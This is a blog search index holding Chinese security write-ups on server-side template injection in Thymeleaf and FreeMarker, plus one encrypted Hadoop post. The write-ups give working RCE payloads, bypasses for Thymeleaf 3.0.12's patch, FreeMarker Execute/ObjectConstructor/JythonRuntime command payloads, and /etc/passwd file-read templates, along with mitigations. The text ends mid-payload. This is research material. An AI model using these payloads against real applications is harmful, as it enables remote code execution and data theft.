<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hadoop环境配置</title>
      <link href="/2022/06/13/hadoop%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
      <url>/2022/06/13/hadoop%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="817f5b244a7ac2175688696cb9961320c68f81b4c54531924377d8ba98562650"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 大数据处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thymeleaf探险</title>
      <link href="/2022/06/12/Thymeleaf%E6%8E%A2%E9%99%A9/"/>
      <url>/2022/06/12/Thymeleaf%E6%8E%A2%E9%99%A9/</url>
      
        <content type="html"><![CDATA[<h1 id="Thymeleaf"><a href="#Thymeleaf" class="headerlink" title="Thymeleaf"></a>Thymeleaf</h1><h2 id="0x01-基础语法"><a href="#0x01-基础语法" class="headerlink" title="0x01 基础语法"></a>0x01 基础语法</h2><ul><li><code>$&#123;...&#125;</code>：变量表达式 —— 通常在实际应用，一般是OGNL表达式或者是 Spring EL，如果集成了Spring的话，可以在上下文变量（context variables ）中执行</li><li><code>*&#123;...&#125;</code>: 选择表达式 —— 类似于变量表达式，区别在于选择表达式是在当前选择的对象而不是整个上下文变量映射上执行。</li><li><code>#&#123;...&#125;</code>: Message (i18n) 表达式 —— 允许从外部源（比如<code>.properties</code>文件）检索特定于语言环境的消息</li><li><code>@&#123;...&#125;</code>: 链接 (URL) 表达式 —— 一般用在应用程序中设置正确的 URL&#x2F;路径（URL重写）。</li><li><code>~&#123;...&#125;</code>：片段表达式 —— <strong>Thymeleaf 3.x 版本新增的内容</strong>，分段段表达式是一种表示标记片段并将其移动到模板周围的简单方法。 正是由于这些表达式，片段可以被复制，或者作为参数传递给其他模板等等</li></ul><p>最后的一个表达式的出现正是导致这次SSTI的关键</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~&#123;templatename::selector&#125;，会在/WEB-INF/templates/目录下寻找名为templatename的模版中定义的fragment</span><br></pre></td></tr></table></figure><ul><li><code>~&#123;templatename&#125;</code>引用templatename的整个模板</li><li><code>~&#123;::selector&#125;</code>引用来自同一个模板的<code>selector</code>的模板内容</li></ul><h2 id="0x02-SSTI"><a href="#0x02-SSTI" class="headerlink" title="0x02 SSTI"></a>0x02 SSTI</h2><p>这次<code>SSTI</code>和之前SSTI不一样，之前的模板利用点都在模板内容本身，或者是因为操作者直接将内容拼接在template中，最后导致了SSTI，这次我们先来看看存在漏洞的代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/admin&quot;)</span> </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">path</span><span class="params">(<span class="meta">@RequestParam</span> String language)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;language/&quot;</span> + language + <span class="string">&quot;/admin&quot;</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据我们的常规认知，现在应该是springboot根据返回值用<code>Thymeleaf</code>模板引擎来寻找对应的文件并且解析。那么我们断点打在return这个位置，一步一步跟进去。</p><p>首先是<code>org.springframework.web.servlet.DispatcherServlet#doDispatch</code>中调用controller方法，返回了<code>modelView</code></p><p><img src="https://img.dem0dem0.top/images/image-20220612095651824.png" alt="image-20220612095651824"></p><p>然后调用<code>processDispatchResult</code>方法，调用<code>render</code>方法，然后通过<code>resolveViewName</code>或者到<code>Thymeleaf</code>引擎调用<code>render</code></p><p><img src="https://img.dem0dem0.top/images/image-20220612101151315.png" alt="image-20220612101151315"></p><p><code>org.thymeleaf.spring5.view.ThymeleafView#renderFragment</code>对我们传入的视图名字进行了处理</p><p><img src="https://img.dem0dem0.top/images/image-20220612101527716.png" alt="image-20220612101527716"></p><p>我们跟进这个方法<code>preprocess</code>精简一下代码，PREPROCESS_EVAL_PATTERN&#x3D;&#x3D;”__x__“</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> String <span class="title function_">preprocess</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> IExpressionContext context,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> String input)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> PREPROCESS_EVAL_PATTERN.matcher(input);</span><br><span class="line">    <span class="keyword">if</span> (matcher.find()) &#123;          </span><br><span class="line">            <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> expression.execute(context, StandardExpressionExecutionContext.RESTRICTED);</span><br></pre></td></tr></table></figure><p>里面就是EL表达式解析了。这样第一个payload也就不难理解了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">__$&#123;<span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream()).next()&#125;__::.k</span><br></pre></td></tr></table></figure><p>至于后面的<code>.k</code>是要符合语法。<code>~&#123;...&#125;</code>这个语法是3.x版本引入的，所以在2.x版本不会受影响。</p><h2 id="0x03-Thymeleaf-SSTI-Bypass"><a href="#0x03-Thymeleaf-SSTI-Bypass" class="headerlink" title="0x03 Thymeleaf SSTI Bypass"></a>0x03 Thymeleaf SSTI Bypass</h2><p>官方发送的通告中，3.0.12版本进行了修复，通过github的diff发现</p><p><img src="https://img.dem0dem0.top/images/image-20220612102856310.png" alt="image-20220612102856310"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">char</span>[] NEW_ARRAY = <span class="string">&quot;wen&quot;</span>.toCharArray(); <span class="comment">// Inverted &quot;new&quot;</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">NEW_LEN</span> <span class="operator">=</span> NEW_ARRAY.length;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">containsSpELInstantiationOrStatic</span><span class="params">(<span class="keyword">final</span> String expression)</span> &#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * Checks whether the expression contains instantiation of objects (&quot;new SomeClass&quot;) or makes use of</span></span><br><span class="line"><span class="comment">        * static methods (&quot;T(SomeClass)&quot;) as both are forbidden in certain contexts in restricted mode.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="keyword">final</span> <span class="type">int</span> <span class="variable">explen</span> <span class="operator">=</span> expression.length();</span><br><span class="line">       <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> explen;</span><br><span class="line">       <span class="type">int</span> <span class="variable">ni</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">// index for computing position in the NEW_ARRAY</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">si</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">       <span class="type">char</span> c;</span><br><span class="line">       <span class="keyword">while</span> (n-- != <span class="number">0</span>) &#123;</span><br><span class="line">           c = expression.charAt(n);</span><br><span class="line">           <span class="comment">// When checking for the &quot;new&quot; keyword, we need to identify that it is not a part of a larger</span></span><br><span class="line">           <span class="comment">// identifier, i.e. there is whitespace after it and no character that might be a part of an</span></span><br><span class="line">           <span class="comment">// identifier before it.</span></span><br><span class="line">           <span class="keyword">if</span> (ni &lt; NEW_LEN</span><br><span class="line">                   &amp;&amp; c == NEW_ARRAY[ni]</span><br><span class="line">                   &amp;&amp; (ni &gt; <span class="number">0</span> || ((n + <span class="number">1</span> &lt; explen) &amp;&amp; Character.isWhitespace(expression.charAt(n + <span class="number">1</span>))))) &#123;</span><br><span class="line">               ni++;</span><br><span class="line">               <span class="keyword">if</span> (ni == NEW_LEN &amp;&amp; (n == <span class="number">0</span> || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="number">1</span>)))) &#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// we found an object instantiation</span></span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">continue</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (ni &gt; <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="comment">// We &#x27;restart&#x27; the matching counter just in case we had a partial match</span></span><br><span class="line">               n += ni;</span><br><span class="line">               ni = <span class="number">0</span>;</span><br><span class="line">               <span class="keyword">if</span> (si &lt; n) &#123;</span><br><span class="line">                   <span class="comment">// This has to be restarted too</span></span><br><span class="line">                   si = -<span class="number">1</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">continue</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           ni = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">if</span> (c == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">               si = n;</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (si &gt; n &amp;&amp; c == <span class="string">&#x27;(&#x27;</span></span><br><span class="line">                       &amp;&amp; ((n - <span class="number">1</span> &gt;= <span class="number">0</span>) &amp;&amp; (expression.charAt(n - <span class="number">1</span>) == <span class="string">&#x27;T&#x27;</span>))</span><br><span class="line">                       &amp;&amp; ((n - <span class="number">1</span> == <span class="number">0</span>) || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="number">2</span>)))) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (si &gt; n &amp;&amp; !(Character.isJavaIdentifierPart(c) || c == <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">               si = -<span class="number">1</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>因此这个过滤，我们不难</p><p>1、表达式中不能含有关键字<code>new</code><br>2、在<code>(</code>的左边的字符不能是<code>T</code><br>3、不能在<code>T</code>和<code>(</code>中间添加的字符使得原表达式出现问题</p><p>所以<code>Character.isJavaIdentifierPart</code>变成了一个突破口,%20,\n等等都可以绕过。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__$&#123;T%20(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)&#125;__::.x</span><br><span class="line">;/__$&#123;T%20(java.lang.runtime).getruntime().exec(&quot;calc&quot;)&#125;__::.x</span><br><span class="line">/__$&#123;T%20(java.lang.runtime).getruntime().exec(&quot;calc&quot;)&#125;__::.x</span><br></pre></td></tr></table></figure><p>在利用的时候，又又又发现了问题。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/home/&#123;page&#125;&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getHome</span><span class="params">(<span class="meta">@PathVariable</span> String page)</span> &#123;</span><br><span class="line">       log.info(<span class="string">&quot;Pages: &quot;</span> + page);</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;home/&quot;</span> + page;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>如果返回的视图名字和path相同的话，(3.0.12版本)上面的payload是不会被触发的。因为还增加了一个函数<code>SpringRequestUtils</code>.</p><p>bypass的话</p><ul><li><p>springboot的矩阵向量(如果发现路径中存在分号，那么会调用<code>removeSemicolonContent</code>方法来移除分号)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">home;/__$&#123;t(java.lang.runtime).getruntime().exec(&quot;open-acalculator&quot;)&#125;__::.x</span><br></pre></td></tr></table></figure></li><li><p>“&#x2F;&#x2F;“在路径处理时</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">home//__$&#123;t(java.lang.runtime).getruntime().exec(&quot;open-acalculator&quot;)&#125;__::.x</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x04-无return如何SSTI"><a href="#0x04-无return如何SSTI" class="headerlink" title="0x04 无return如何SSTI"></a>0x04 无return如何SSTI</h2><p>根据spring boot定义，如果controller无返回值，则以GetMapping的路由为视图名称。当然，对于每个http请求来讲，其实就是将请求的url作为视图名称，调用模板引擎去解析。<a href="https://docs.spring.io/spring/docs/current/spring-framework-reference/web.html#mvc-ann-return-types">https://docs.spring.io/spring/docs/current/spring-framework-reference/web.html#mvc-ann-return-types</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span><br><span class="line">public void getDocument(@PathVariable String document) &#123;</span><br><span class="line">    log.info(&quot;Retrieving &quot; + document);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /doc/__$&#123;T(java.lang.Runtime).getRuntime().exec(&quot;touch executed&quot;)&#125;__::.x</span><br></pre></td></tr></table></figure><p>至于如何bypass不用多说了吧。</p><h2 id="0x05-key-如果模板内容可控能否bypass"><a href="#0x05-key-如果模板内容可控能否bypass" class="headerlink" title="0x05:key:如果模板内容可控能否bypass?"></a>0x05:key:如果模板内容可控能否bypass?</h2><p>这种低版本，直接嗦了~~</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">th:inline</span>=<span class="string">&quot;text&quot;</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;@&#123;__$&#123;exp&#125;__&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x05修复方案"><a href="#0x05修复方案" class="headerlink" title="0x05修复方案"></a>0x05修复方案</h2><h3 id="1-设置ResponseBody注解"><a href="#1-设置ResponseBody注解" class="headerlink" title="1. 设置ResponseBody注解"></a>1. 设置ResponseBody注解</h3><p>如果设置<code>ResponseBody</code>，则不再调用模板解析</p><h3 id="2-设置redirect重定向"><a href="#2-设置redirect重定向" class="headerlink" title="2. 设置redirect重定向"></a>2. 设置redirect重定向</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;/safe/redirect&quot;)</span><br><span class="line">public String redirect(@RequestParam String url) &#123;</span><br><span class="line">    return &quot;redirect:&quot; + url; //CWE-601, as we can control the hostname in redirect</span><br></pre></td></tr></table></figure><p>根据spring boot定义，如果名称以<code>redirect:</code>开头，则不再调用<code>ThymeleafView</code>解析，调用<code>RedirectView</code>去解析<code>controller</code>的返回值</p><h3 id="3-response"><a href="#3-response" class="headerlink" title="3. response"></a>3. response</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;/safe/doc/&#123;document&#125;&quot;)</span><br><span class="line">public void getDocument(@PathVariable String document, HttpServletResponse response) &#123;</span><br><span class="line">    log.info(&quot;Retrieving &quot; + document); //FP</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><ol><li><p>panda: <a href="https://blog.cnpanda.net/sec/1063.html">https://blog.cnpanda.net/sec/1063.html</a></p></li><li><p>宽字节师傅: <a href="https://paper.seebug.org/1332/3">https://paper.seebug.org/1332/3</a></p></li><li><p>拓展:<a href="https://www.cnblogs.com/CoLo/p/15507738.html">https://www.cnblogs.com/CoLo/p/15507738.html</a></p></li><li><p>更多形势的payload:<a href="https://xz.aliyun.com/t/9826#toc-4">https://xz.aliyun.com/t/9826#toc-4</a></p><p><code>$&#123;&#125; / *&#123;&#125; / $&#123;&#123;&#125;&#125;</code>还有<code>__</code>还有<code>.x</code>和<code>::</code></p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FreeMarker初探</title>
      <link href="/2022/06/10/FreeMarker%E5%88%9D%E6%8E%A2/"/>
      <url>/2022/06/10/FreeMarker%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a>FreeMarker</h1><p>FreeMarker 是一款模板引擎，即一种基于模板和需要改变的数据， 并用来生成输出文本( HTML 网页，电子邮件，配置文件，源代码等)的通用工具，其模板语言为 FreeMarker Template Language (FTL）。</p><h2 id="0x01-简单的demo"><a href="#0x01-简单的demo" class="headerlink" title="0x01 简单的demo"></a>0x01 简单的demo</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一步：创建一个Configuration对象，直接new一个对象。构造方法的参数就是FreeMarker对于的版本号。</span></span><br><span class="line"><span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>(Configuration.getVersion());</span><br><span class="line"><span class="comment">// 第二步：设置模板文件所在的路径。</span></span><br><span class="line">configuration.setDirectoryForTemplateLoading(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/WEB-INF/ftl&quot;</span>));</span><br><span class="line"><span class="comment">// 第三步：设置模板文件使用的字符集。一般就是utf-8.</span></span><br><span class="line">configuration.setDefaultEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="comment">// 第四步：加载一个模板，创建一个模板对象。</span></span><br><span class="line"><span class="type">Template</span> <span class="variable">template</span> <span class="operator">=</span> configuration.getTemplate(<span class="string">&quot;hello.ftl&quot;</span>);</span><br><span class="line"><span class="comment">// 第五步：创建一个模板使用的数据集，可以是pojo也可以是map。一般是Map。</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">dataModel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="comment">//向数据集中添加数据</span></span><br><span class="line">dataModel.put(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;this is my first FreeMarker test.&quot;</span>);</span><br><span class="line"><span class="comment">// 第六步：创建一个Writer对象，一般创建一FileWriter对象，指定生成的文件名。</span></span><br><span class="line"><span class="type">Writer</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/hello.html&quot;</span>));<span class="comment">//这里可以用StringBuilder ==&gt; 直接回显</span></span><br><span class="line"><span class="comment">// 第七步：调用模板对象的process方法输出文件。</span></span><br><span class="line">template.process(dataModel, out);</span><br><span class="line"><span class="comment">// 第八步：关闭流。</span></span><br><span class="line">out.close();</span><br></pre></td></tr></table></figure><h2 id="0x02-标签的基本语法"><a href="#0x02-标签的基本语法" class="headerlink" title="0x02 标签的基本语法"></a>0x02 标签的基本语法</h2><p>freemarker中需要特殊处理的三种标签</p><ul><li><code>$&#123;*...*&#125;</code>： FreeMarker将会输出真实的值来替换大括号内的表达式，这样的表达式被称为 <strong>interpolation</strong>(在文本区(比如 <code>Hello $&#123;name&#125;!</code>) 和字符串表达式(比如 <code>&lt;#include &quot;/footer/$&#123;company&#125;.html&quot;&gt;</code>)中。)</li><li><strong>FTL 标签</strong> (FreeMarker模板的语言标签)： FTL标签和HTML标签有一些相似之处，但是它们是FreeMarker的指令，是不会在输出中打印的。 这些标签的名字以 <code>#</code> 开头。(用户自定义的FTL标签则需要使用 <code>@</code> 来代替 <code>#</code>，但这属于更高级的话题了。)</li><li><strong>注释：</strong> 注释和HTML的注释也很相似， 但是它们使用 <code>&lt;#--</code> and <code>--&gt;</code> 来标识。 不像HTML注释那样，FTL注释不会出现在输出中(不出现在访问者的页面中)， 因为 FreeMarker会跳过它们。</li></ul><p>freemarker中的用户标签和自定义标签的区别</p><ul><li>… 输出(返回值)的是标记(HTML,XML等)。 主要原因是函数的返回结果可以自动进行XML转义(这是因为 <code>$&#123;*...*&#125;</code> 的特性)， 而用户自定义指令的输出则不是 (这是因为 <code>&lt;@*...*&gt;</code> 的特性所致; 它的输出假定是标记，因此已经转义过了)。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec:84, Execute (freemarker.template.utility)</span><br><span class="line">_eval:62, MethodCall (freemarker.core)</span><br><span class="line">eval:101, Expression (freemarker.core)</span><br><span class="line">calculateInterpolatedStringOrMarkup:100, DollarVariable (freemarker.core)</span><br><span class="line">accept:63, DollarVariable (freemarker.core)</span><br><span class="line">visit:347, Environment (freemarker.core)</span><br><span class="line">visit:353, Environment (freemarker.core)</span><br><span class="line">process:326, Environment (freemarker.core)</span><br><span class="line">process:383, Template (freemarker.template)</span><br><span class="line">createHtmlFromString:60, TestController (com.dem0.freemarker.controller)</span><br></pre></td></tr></table></figure><h2 id="0x03-内建函数"><a href="#0x03-内建函数" class="headerlink" title="0x03 内建函数"></a>0x03 内建函数</h2><blockquote><p>我们突破的时候经常会使用的内建函数： <a href="http://freemarker.foofun.cn/ref_builtins.html">http://freemarker.foofun.cn/ref_builtins.html</a> </p><p>除了内建函数之后，应该就是内建对象了。</p></blockquote><h3 id="api"><a href="#api" class="headerlink" title="api"></a><code>api</code></h3><p><code>value?api.someJavaMethod()</code>。使用大概像这样，可以调用一些java的api，使用起来非常刺激，就会又归结到最后java层面的webshell了，很有趣!</p><p>但是这个函数启用需要很多条件。**必须在配置项<code>api_builtin_enabled</code>为<code>true</code>时才有效，而该配置在<code>2.3.22</code>版本之后默认为<code>false</code>**。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  &lt;#assign classLoader=object?api.class.protectionDomain.classLoader&gt;</span><br><span class="line">  eg1：</span><br><span class="line">  &lt;#assign classLoader=object?api.class.getClassLoader()&gt;</span><br><span class="line">  $&#123;classLoader.loadClass(<span class="string">&quot;our.desired.class&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line">  eg2： 任意文件读</span><br><span class="line">  &lt;#assign uri=object?api.class.getResource(<span class="string">&quot;/&quot;</span>).toURI()&gt;</span><br><span class="line">  &lt;#assign input=uri?api.create(<span class="string">&quot;file:///etc/passwd&quot;</span>).toURL().openConnection()&gt;</span><br><span class="line">  &lt;#assign is=input?api.getInputStream()&gt;</span><br><span class="line">  FILE:[&lt;#list <span class="number">0.</span><span class="number">.999999999</span> as _&gt;</span><br><span class="line">      &lt;#assign <span class="type">byte</span>=is.read()&gt;</span><br><span class="line">      &lt;#<span class="type">if</span> <span class="variable">byte</span> <span class="operator">=</span>= -<span class="number">1</span>&gt;</span><br><span class="line">          &lt;#<span class="keyword">break</span>&gt;</span><br><span class="line">      &lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">  $&#123;<span class="type">byte</span>&#125;, &lt;/#list&gt;]</span><br><span class="line">eg3: </span><br><span class="line">   &lt;#assign is=object?api.class.getResourceAsStream(<span class="string">&quot;/etc/passwd&quot;</span>)&gt;</span><br><span class="line">    FILE:[&lt;#list <span class="number">0.</span><span class="number">.999999999</span> as _&gt;</span><br><span class="line">    &lt;#assign <span class="type">byte</span>=is.read()&gt;</span><br><span class="line">    &lt;#<span class="type">if</span> <span class="variable">byte</span> <span class="operator">=</span>= -<span class="number">1</span>&gt;</span><br><span class="line">        &lt;#<span class="keyword">break</span>&gt;</span><br><span class="line">    &lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">    $&#123;<span class="type">byte</span>&#125;, &lt;/#list&gt;]</span><br><span class="line">eg4:</span><br><span class="line">&lt;#assign uri=object?api.class.getResource(<span class="string">&quot;/&quot;</span>).toURI()&gt;</span><br><span class="line">    &lt;#assign input=uri?api.create(<span class="string">&quot;file:///etc/passwd&quot;</span>).toURL().openConnection()&gt;</span><br><span class="line">    &lt;#assign is=input?api.getInputStream()&gt;</span><br><span class="line">    FILE:[&lt;#list <span class="number">0.</span><span class="number">.999999999</span> as _&gt;</span><br><span class="line">    &lt;#assign <span class="type">byte</span>=is.read()&gt;</span><br><span class="line">    &lt;#<span class="type">if</span> <span class="variable">byte</span> <span class="operator">=</span>= -<span class="number">1</span>&gt;</span><br><span class="line">        &lt;#<span class="keyword">break</span>&gt;</span><br><span class="line">    &lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">    $&#123;<span class="type">byte</span>&#125;, &lt;/#list&gt;]</span><br><span class="line">eg5:获取classLoader</span><br><span class="line">&lt;#assign classLoader=object?api.class.protectionDomain.classLoader&gt;</span><br><span class="line">    &lt;#assign clazz=classLoader.loadClass(<span class="string">&quot;ClassExposingGSON&quot;</span>)&gt;</span><br><span class="line">    &lt;#assign field=clazz?api.getField(<span class="string">&quot;GSON&quot;</span>)&gt;</span><br><span class="line">    &lt;#assign gson=field?api.get(<span class="literal">null</span>)&gt;</span><br><span class="line">    &lt;#assign ex=gson?api.fromJson(<span class="string">&quot;&#123;&#125;&quot;</span>, classLoader.loadClass(<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>))&gt;</span><br><span class="line">    $&#123;ex(<span class="string">&quot;calc&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><h3 id="new"><a href="#new" class="headerlink" title="new"></a><code>new</code></h3><p>这个就是可以新建一个对象<code>用来创建一个具体实现了</code>TemplateModel<code>接口的变量的内建函数</code>.三个符合条件的函数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()&gt;</span><br><span class="line">$&#123;value(<span class="string">&quot;calc.exe&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="keyword">new</span>()&gt;</span><br><span class="line">$&#123;value(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>,<span class="string">&quot;calc.exe&quot;</span>).start()&#125;</span><br><span class="line"></span><br><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.JythonRuntime&quot;</span>?<span class="keyword">new</span>()&gt;</span><br><span class="line">&lt;<span class="meta">@value</span>&gt;<span class="keyword">import</span> os;os.system(<span class="string">&quot;calc.exe&quot;</span>)&lt;/<span class="meta">@value</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//freemarker.template.utility.Execute实现了TemplateMethodModel接口(继承自TemplateModel)</span></span><br><span class="line">&lt;#assign ex=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()&gt; </span><br><span class="line">$&#123;ex(<span class="string">&quot;id&quot;</span>)&#125;<span class="comment">//系统执行id命令并返回</span></span><br></pre></td></tr></table></figure><p>但是也依然受到了限制<code>cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);</code>,这样就可以ban掉。</p><p><img src="https://c.img.dasctf.com/images/2022529/1653791142606-66883bc3-7df6-47a1-a6ed-e2d0cf4fe9bd.png" alt="image-20220529102538971"></p><p><a href="https://freemarker.apache.org/docs/api/freemarker/core/Configurable.html#setAPIBuiltinEnabled-boolean">Configurable.setAPIBuiltinEnabled</a>可以通过这个开启。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#--    回显 --&gt;</span><br><span class="line">    &lt;#assign ob=<span class="string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="keyword">new</span>()&gt;</span><br><span class="line">    &lt;#assign br=ob(<span class="string">&quot;java.io.BufferedReader&quot;</span>,ob(<span class="string">&quot;java.io.InputStreamReader&quot;</span>,ob(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>,<span 